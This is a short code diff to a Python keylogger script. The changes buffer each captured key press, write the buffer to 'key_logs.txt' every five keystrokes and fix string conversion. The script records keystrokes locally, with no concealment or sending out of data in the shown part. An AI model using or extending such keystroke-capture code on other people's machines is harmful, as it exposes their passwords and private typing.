@@ -6,12 +6,21 @@ keys = []
 
 def on_press(key):
     global count, keys
+
+    keys.append(key)
+    count += 1
     print(key)
 
+    if count >= 5:
+        count = 0
+        write_file(keys)
+        keys = []
+        print("Keys saved to file")
+
 def write_file(keys):
-    with open("key_log.txt", "a") as f:
+    with open("key_logs.txt", "a") as f:
         for key in keys:
-            f.write(key)
+            f.write(str(key))
     
 
 def on_release(key):
